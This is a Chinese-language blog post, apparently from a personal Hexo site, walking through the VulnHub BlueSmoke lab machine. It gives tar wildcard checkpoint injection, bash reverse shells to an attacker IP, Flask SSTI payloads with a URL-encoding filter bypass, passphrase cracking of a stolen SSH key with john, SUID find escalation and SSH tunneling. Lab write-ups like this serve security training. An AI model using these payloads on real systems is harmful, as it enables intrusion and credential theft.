@@ -1,0 +1,746 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="VULNHUB 31-40" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/138%20BLUESOMKE/">
+
+
+
+  <title>
+VULNHUB BLUESOMKE - VULNHUB |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">VULNHUB BLUESOMKE
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-01 14:06:58">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-01T14:06:58+08:00">2023-07-01</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/zcSdCfaZpwgIBoW.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ukLG5BwF6jH1ONA.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/R6S5zNpXVctWQqT.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/JUZqV6zBpbmk97w.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/VULNHUB/" itemprop="item" rel="index" title="分类于 VULNHUB"><span itemprop="name">VULNHUB</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/01/VULNHUB/138%20BLUESOMKE/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZXNtb2tlLWRldnJhbmRvbTIsNjc4Lw==">https://www.vulnhub.com/entry/bluesmoke-devrandom2,678/</span><br>
+ 教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly92aXNoYWwtY2hhbmRhay5tZWRpdW0uY29tL3Z1bG5odWItYmx1ZXNtb2tlLQ==">https://vishal-chandak.medium.com/vulnhub-bluesmoke-</span><br>
+devrandom2-write-up-a669e7382ba0</p>
+<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
+<p>攻击机 kali： 1 92.168.31. 78<br>
+ 靶机 VENUS：桥接于 1 92.168.31.1 的网卡，ip 未知</p>
+<p>1 ）确定靶机 ip 地址和开放的端口<br>
+由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>
+ sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>
+<p>à 靶机 ip：192.168.31. 84 、靶机开放端口 22 , 80</p>
+<h3 id="002-定期执行的tar文件反弹shelltar命令漏洞"><a class="markdownIt-Anchor" href="#002-定期执行的tar文件反弹shelltar命令漏洞">#</a> 002 定期执行的 tar 文件反弹 shell，tar 命令漏洞</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">http://192.168.31.</span> 84 / 进行信息收集</p>
+<p>对方服务器回执行我们上传的 tar 文件，通过上传恶意 tar 文件反弹 shell<br>
+cat &gt; <span class="exturl" data-url="aHR0cDovL2V4cC5zaA==">exp.sh</span> &lt;&lt; EOF<br>
+#! /bin/bash<br>
+bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.78/4444 0&gt;&amp;1’<br>
+EOF</p>
+<p>这里的 ip 我做了别名并且加入到了环境变量里边，对 ifconfig 的结果做了过<br>
+滤，所以有这么一个奇怪的命令</p>
+<p>echo “” &gt; “–checkpoint-action=exec=sh <span class="exturl" data-url="aHR0cDovL2V4cC5zaA==">exp.sh</span>”<br>
+echo “” &gt; --checkpoint=1<br>
+tar -cf tar_shell.tar ./*</p>
+<p>–checkpoint [=NUMBER] 每第 NUMBER 条记录显示进度消息（默认为 10 ）<br>
+–checkpoint-action=ACTION 在每个检查点上执行 ACTION<br>
+ 意味着对方去使用 tar 的时候会执行我们的 exp.sh 从而将 shell 反弹出来</p>
+<p>将 exp.sh 上传到网站上</p>
+<p>上传成功后，没多长时间我们就接受到了反弹的 shell</p>
+<p>将接受到的 shell 变成一个标准的 shell 终端</p>
+<h3 id="查看计划任务看是什么情况造成这个漏洞的"><a class="markdownIt-Anchor" href="#查看计划任务看是什么情况造成这个漏洞的">#</a> 查看计划任务看是什么情况造成这个漏洞的</h3>
+<p>crontab -l | tail -n 1</p>
+<p>可见靶机上有 tar - cvf 的压缩命令的定时任务被定期执行</p>
+<h3 id="003-ssh私钥密码破解源码编译john软连接配置全局命令"><a class="markdownIt-Anchor" href="#003-ssh私钥密码破解源码编译john软连接配置全局命令">#</a> 003 ssh 私钥密码破解，源码编译 john，软连接配置全局命令</h3>
+<p>收集服务器的相关信息，如 id 查看用户组，查看 linux 的版本，查看 pkexec 是<br>
+否存在，上传 pspy 监控，上传 linpeas 监控服务器上的敏感信息，寻找服务器<br>
+的权限设置错误，查找 s 权限的文件，看有无端口敲门漏洞，看端口信息是否<br>
+可做隧道，脏牛提权，敏感的配置文件信息，定时任务等</p>
+<p>对上述做了全面信息收集后，并没有找到可利用的点，继续找，找到了 ssh 配<br>
+对的信息，可以尝试利用此 ssh 私钥连接到其他用户。<br>
+cat ~/.ssh/id_rsa</p>
+<p>看到这个 ssh 私钥文件内容比正常无密码的 ssh 要多一点，怀疑有密钥上有一层<br>
+密码，需要通过相关工具来破解出密钥的密码</p>
+<p>查看靶机上总共有哪几个用户<br>
+ cat /etc/passwd | grep bash</p>
+<h3 id="我们就是要用这个私钥文件分别配对四个用户进行免密登陆"><a class="markdownIt-Anchor" href="#我们就是要用这个私钥文件分别配对四个用户进行免密登陆">#</a> 我们就是要用这个私钥文件分别配对四个用户进行免密登陆</h3>
+<p>将私钥文件发送至我们的 kali 攻击机<br>
+ scp id_rsa <span class="exturl" data-url="bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjc4">parallels@192.168.31.78</span>:/tmp/tmp</p>
+<h3 id="尝试用此私钥登陆对方服务器时提醒我们需要输入密码"><a class="markdownIt-Anchor" href="#尝试用此私钥登陆对方服务器时提醒我们需要输入密码">#</a> 尝试用此私钥登陆对方服务器时，提醒我们需要输入密码</h3>
+<p>ssh -i id_rsa <span class="exturl" data-url="bWFpbHRvOmJhY2t1cHBlckAxOTIuMTY4LjMxLjg0">backupper@192.168.31.84</span></p>
+<p>破解 ssh 私钥的密码首先想到的就是 john 工具<br>
+先用 ssh 2 john 将私钥文件转化为 john 可识别的文件<br>
+ ssh2john id_rsa &gt; id_rsa_hash</p>
+<p>再用 john 去破解私钥的 hash 文件<br>
+ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</p>
+<p>没有爆破出来，这个 john 工具出现了问题，干脆删了它，重新编译一个 john</p>
+<p>并不知道 john 是以何种方式安装的，可以尝试打印其路径，删除其二进制文<br>
+件，或者先用 apt 源尝试卸载 john<br>
+sudo apt remove john</p>
+<p>看来就是通过 apt 源中下载的 john，将其卸载干净之后，再次输入 john 的命令<br>
+判断出来此服务器目前没有了此命令</p>
+<p>下一步就是通过源码编译 john，一般的命令在 github 或者官网上寻找<br>
+<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4="> https://github.com/openwall/john</span></p>
+<p>wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29wZW53YWxsL2pvaG4vYXJjaGl2ZS9yZWZzL3RhZ3MvMS45LjAtSnVtYm8tMS56aXA=">https://github.com/openwall/john/archive/refs/tags/1.9.0-Jumbo-1.zip</span></p>
+<p>cd john-1.9.0-Jumbo- 1<br>
+ 在 src 文件夹下配置：./configure</p>
+<p>同一文件下使用 make 命令编译</p>
+<p>在 run 文件夹下使用: ./john<br>
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash</p>
+<p>破解得到 ssh 私钥文件的密码是 samantha1</p>
+<p>将我们编译成功的 john 配置到全局，以软连接的方式强制放到 /usr/bin/john<br>
+sudo ln -sf ~/Desktop/redteam/john/john-1.9.0-Jumbo-1/run/john /usr/bin/john</p>
+<ul>
+<li>s 表示添加软连接，-f 表示强制添加，第一个位置是原位置，第二个位置是添<br>
+加了软连接之后的位置</li>
+</ul>
+<p>输入 john 之后可以看到此命令已经变成全局命令了</p>
+<p>凭借私钥及其密码 samantha1 依次尝试前面得到服务器四个有 bash 的用户登<br>
+陆，最终凭借 jaap 用户登录到了服务器<br>
+ ssh <span class="exturl" data-url="bWFpbHRvOmphYXBAMTkyLjE2OC4zMS44NA==">jaap@192.168.31.84</span> - i id_isa</p>
+<h3 id="004-用户组权限利用相关文件漏洞提权推理"><a class="markdownIt-Anchor" href="#004-用户组权限利用相关文件漏洞提权推理">#</a> 004 用户组权限利用，相关文件漏洞提权推理</h3>
+<p>拿到 jaap 的权限之后，我们同样是没有一些通用的提权方式提权的，需要翻阅<br>
+文件，看靶机设计者给了我们哪些文件，找到主目录下有两个敏感文件，一个<br>
+是 s 权限的 find 命令，另一个是 startserver.sh 的脚本</p>
+<p>ls - Alh 看到 find 属于 jaap 用户和 remnie 用户组<br>
+尝试是否可以用 remnie 的权限使用 find 提权<br>
+ sudo -u remnie ./find. -exec /bin/bash -p ; -quit<br>
+ 没有 sudo 权限，就只能借用 jaap 来执行从而拿到 remnie 的用户组权限<br>
+./find. -exec /bin/sh -p ; -quit</p>
+<p>有了 remnie 的用户组权限，就可以进入到其用户目录下，查看到有段提示<br>
+说是在本地的某个端口处有一些问题</p>
+<p>查看到 scripts 中的 start.sh 中有一些代码<br>
+使用 /tmp/start 创建一个变量文件名，<br>
+如果文件开始在那里，将使用 ps 命令从进程运行的 grep 形式的 <span class="exturl" data-url="aHR0cDovL3NlcnZlci5weQ==">server.py</span>，<br>
+如果 <span class="exturl" data-url="aHR0cDovL3NlcnZlci5weQ==">server.py</span> 没有运行，它将运行它，如果是，则它会回显该消息。</p>
+<h3 id="查看一下当前有哪些端口在运行记录一下"><a class="markdownIt-Anchor" href="#查看一下当前有哪些端口在运行记录一下">#</a> 查看一下当前有哪些端口在运行，记录一下</h3>
+<p>上传 pspy 监控，发现的确没有 server.py 被执行</p>
+<p>于是我们接下来就需要去操作得到 /tmp/start 这个文件，记得之前在 jaap 用户中<br>
+找到过一个 startserver.sh 的文件，去看一看这个文件<br>
+这个文件就是用来将 1 输入到 /tmp/start 中的，之后后看 pspy 监控</p>
+<p>Pspy 中监听到了 remnie 用户下的 start.sh 执行了，判断出此时靶机上的某个端<br>
+口被打开了，看一看目前开放的端口有哪些</p>
+<h3 id="此时本地端口-8787-成功被打开了"><a class="markdownIt-Anchor" href="#此时本地端口-8787-成功被打开了">#</a> 此时本地端口 8787 成功被打开了</h3>
+<p>服务器上有 curl 命令，用 curl 测试得到是一个网站，但是服务器不存在 iptables<br>
+ 命令，无法将 8787 端口外放，意外着外界无法访问到此端口，这时候就需要做<br>
+ ssh 的端口转发</p>
+<h3 id="005-ssh端口转发绕防火墙nohup无日志后台运行ssh穿透"><a class="markdownIt-Anchor" href="#005-ssh端口转发绕防火墙nohup无日志后台运行ssh穿透">#</a> 005 ssh 端口转发绕防火墙，nohup 无日志后台运行，ssh 穿透</h3>
+<p>ssh 端口转发就是将我们访问某一个 ip:port 的流量转发至另一个 ip:port<br>
+ 如下，在此我的公网 ip 地址中存在一个网站，想要通过 ssh 端口转发，将我本<br>
+地访问 localhost 的某一个端口的流量转发至这个页面</p>
+<p>lsof -i:7001 判断本地的 7001 端口并没有被占用<br>
+ ssh -p 2121 -L 7000:localhost:80 <span class="exturl" data-url="bWFpbHRvOnJvb3RAMS4xMTcuNTIuMjE5">root@1.117.52.219</span> -i /etc/ssh/cloud.pem -N<br>
+ 将访问本地 7000 端口的信息转发到远程主机的 80 端口上面</p>
+<ul>
+<li>p 表示进入服务器的端口，-L 表示转发规则，前者为本地端口，后者为远程端<br>
+口，-i 指定私钥文件进行免密，-N 表示不进入服务器</li>
+</ul>
+<h3 id="于是我们访问本地的-7001-端口便可以进入到公网上的页面"><a class="markdownIt-Anchor" href="#于是我们访问本地的-7001-端口便可以进入到公网上的页面">#</a> 于是，我们访问本地的 7001 端口便可以进入到公网上的页面</h3>
+<h3 id="假如远程主机在-9888-端口部署了一个服务器但是防火墙并没有开放这个端口"><a class="markdownIt-Anchor" href="#假如远程主机在-9888-端口部署了一个服务器但是防火墙并没有开放这个端口">#</a> 假如远程主机在 9888 端口部署了一个服务器，但是防火墙并没有开放这个端口，</h3>
+<p>如果本地想要访问这个 9888 ，就可以用上面的案例来绕过防火墙进行 ssh 访问。</p>
+<p>可以使用 nohup 进行后台运行<br>
+ nohup ssh -p2121 -L 7001:localhost:80 <span class="exturl" data-url="bWFpbHRvOnJvb3RAMS4xMTcuNTIuMjE5">root@1.117.52.219</span> -i /etc/ssh/cloud.pem -N &amp;<br>
+ 使用一句话命令直接清理本地的 7001 端口<br>
+ lsof -i: 7001 | awk ‘{print $2}’ | grep -v ‘PID’ | uniq | xargs kill - 9</p>
+<p>nohup 无日志产生的后台运行如下<br>
+ nohup java -jar ruoyi-admin.jar &gt;/dev/null 2&gt;&amp;1 &amp;</p>
+<h3 id="我们通过端口转发来将我们本地访问-8787-端口时进入到靶机的-8787-界面从"><a class="markdownIt-Anchor" href="#我们通过端口转发来将我们本地访问-8787-端口时进入到靶机的-8787-界面从">#</a> 我们通过端口转发来将我们本地访问 8787 端口时进入到靶机的 8787 界面，从</h3>
+<h3 id="而绕过防火墙规则靶机上需要确定开放了-8787"><a class="markdownIt-Anchor" href="#而绕过防火墙规则靶机上需要确定开放了-8787">#</a> 而绕过防火墙规则，靶机上需要确定开放了 8787</h3>
+<p>在我们的主机上执行: ssh -L 8787:127.0.0.1:8787 -i id_rsa jaap@192.168.31. 85 - N<br>
+ 于是我门主机打开 8787 的页面就进入到了靶机对应的窗口中</p>
+<p>接下来转变为对这个端口所在的 web 的测试</p>
+<p>既然提到了 ssh 的端口转发，不得不说一下 ssh 的内网穿透<br>
+可以将内网的服务穿透到公网上去，实现如下<br>
+ user1 mac: lsof -i:1122<br>
+user2 kali: ssh -Nf -R *:1122:localhost:22 <span class="exturl" data-url="bWFpbHRvOmNoZW50dW9AMTkyLjE2OC4zMS4xOQ==">chentuo@192.168.31.19</span></p>
+<ul>
+<li>R 表示远程端口转发，-N 表示不执行，-f 后台运行<br>
+这条命令将指定 user 2 的 1122 端口连接到 user 1 的 22 端口<br>
+ user3 windows: ssh -p 1122 <span class="exturl" data-url="bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjE5">parallels@192.168.31.19</span></li>
+</ul>
+<p>user3 通过连接 user1 的 1122 端口连接到了 user2 上<br>
+下图中从上至下分别表示 mac，kali，windows 三个机器</p>
+<p>即 user 1 相当于一个公网跳板，一个内网的机器连接这个跳板就可以连接到另<br>
+外一个内网的机器，user 3 连接到公网跳板的流量被转发到了另一台内网机器</p>
+<h3 id="006-ssti反弹shell被过滤后的绕过"><a class="markdownIt-Anchor" href="#006-ssti反弹shell被过滤后的绕过">#</a> 006 SSTI 反弹 shell，被过滤后的绕过</h3>
+<h3 id="打开-1-270018787开始测试网站漏洞"><a class="markdownIt-Anchor" href="#打开-1-270018787开始测试网站漏洞">#</a> 打开 1 27.0.0.1:8787 开始测试网站漏洞</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">是由py语言写的，并且是flask框架，可以测试SSTI模板注入</span><br><span class="line"></span><br><span class="line">[http://127.0.0.1:8787/?name=&#123;&#123;10*10&#125;&#125;](http://127.0.0.1:8787/?name=&#123;&#123;10*10&#125;&#125;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 回显是计算结果，表示存在此模板注入</span></span></span><br><span class="line"></span><br><span class="line">利用SSTI模板注入在反弹shell到kali机器上</span><br><span class="line">[http://127.0.0.1:8787/?name=](http://127.0.0.1:8787/?name=) &#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp;</span><br><span class="line">/dev/tcp/192.168.31.83/4444 &gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 反弹失败可能是采用了过滤机制</span></span></span><br><span class="line"></span><br><span class="line">利用url编码绕过过滤机制，http://www.jsons.cn/urlencode上进行url编码转化</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将上述中用来反弹shell的代码进行url编码后得到如下网址</span><br><span class="line">[http://127.0.0.1:8787/?name=](http://127.0.0.1:8787/?name=) %7B%25%20import%20os%20%25%7D%7B%7Bos.s</span><br><span class="line">ystem(&#x27;bash%20-c%20%22bash%20-</span><br><span class="line"><span class="meta prompt_">i%</span><span class="language-bash">20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.83%2F4444%20%3E%261%22<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="string">7D%7D</span></span></span><br><span class="line"></span><br><span class="line">继续访问此网站用来反弹shell，依然是无效果的</span><br><span class="line"></span><br><span class="line">换种方式来执行，在对方服务器上写一个sh的反弹脚本，利用SSTI去读取这</span><br><span class="line">个脚本并执行</span><br><span class="line">cat &gt; /tmp/shell.sh &lt;&lt; EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">! /bin/bash</span></span></span><br><span class="line">bash - c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">访问如下网址用另外的方式来反弹shell</span><br><span class="line">[http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__impor](http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__impor)</span><br><span class="line"><span class="meta prompt_">t__(%</span><span class="language-bash"><span class="string">27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&#125;&#125;</span></span></span><br><span class="line"></span><br><span class="line">反弹虽然成功了，但却立即断开了，原因不明，将机器重新启动后，shell成功</span><br><span class="line">被反弹出来，接收到了一个稳定的shell</span><br></pre></td></tr></table></figure>
+<p>将所得到的 shell 利用如下三行代码输出为标准的 shell</p>
+<p>现在我们成功拿到了 remnie 用户的 shell</p>
+<p>remnie 用户下的 server.py 文件就是形成此漏洞的原因</p>
+<h3 id="007-awk配合cut使用vim不进入写模式更改文件二进制解密"><a class="markdownIt-Anchor" href="#007-awk配合cut使用vim不进入写模式更改文件二进制解密">#</a> 007 awk 配合 cut 使用，vim 不进入写模式更改文件，二进制解密</h3>
+<h3 id="我们现在仍然在一个既没有内核漏洞可以提权也没有相关权限设置错误提权"><a class="markdownIt-Anchor" href="#我们现在仍然在一个既没有内核漏洞可以提权也没有相关权限设置错误提权">#</a> 我们现在仍然在一个既没有内核漏洞可以提权，也没有相关权限设置错误提权</h3>
+<p>的机器上，只能寻找于 remnie 相关的文件来找突破口，看到用户主目录下有一<br>
+个 server.conf 的配置文件，进行查看之后看到了如下信息。</p>
+<p>提示说是一个连接 root 服务的文件，这个文件中最右边的这些二进制数字比较<br>
+可疑，尝试将他们进行二进制解密</p>
+<p>将这些二进制数字利用 linux 命令做分隔符打印出来<br>
+ cat server.conf | cut -d ‘|’ -f 2 &gt; binary.txt</p>
+<p>Vim 不进入写模式将换行符换为空<br>
+ vim 1.txt +&quot;:% s/\n//g&quot; +wq</p>
+<p>From binary 解密二进制之后得到了十六进制的如下数据</p>
+<p>From magic 解密之后得到了 root 账户的密码<br>
+ root:-!F8h2LMr&lt;[n]`N] Kq</p>
+<p>利用如下命令切换至 root 用户，成功拿到了 root 账户的权限</p>
+
+      <div class="tags">
+          <a href="/tags/VULNHUB-31-40/" rel="tag"><i class="ic i-tag"></i> VULNHUB 31-40</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-01 14:28:55" itemprop="dateModified" datetime="2023-07-01T14:28:55+08:00">2023-07-01</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/07/01/VULNHUB/138%20BLUESOMKE/" title="VULNHUB BLUESOMKE">http://n1h1l157.github.io/2023/07/01/VULNHUB/138 BLUESOMKE/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/01/VULNHUB/139%20INFERNO/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;YEamGBSIV7f2MAH.jpg" title="VULNHUB INFERNO">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB INFERNO</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/07/01/VULNHUB/137%20VENUS/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;EJFKatQPUYXWgNZ.jpg" title="VULNHUB VENUS">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
+  <h3>VULNHUB VENUS</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E5%AE%9A%E6%9C%9F%E6%89%A7%E8%A1%8C%E7%9A%84tar%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shelltar%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> 002 定期执行的 tar 文件反弹 shell，tar 命令漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%9C%8B%E6%98%AF%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E9%80%A0%E6%88%90%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text"> 查看计划任务看是什么情况造成这个漏洞的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-ssh%E7%A7%81%E9%92%A5%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91john%E8%BD%AF%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE%E5%85%A8%E5%B1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text"> 003 ssh 私钥密码破解，源码编译 john，软连接配置全局命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 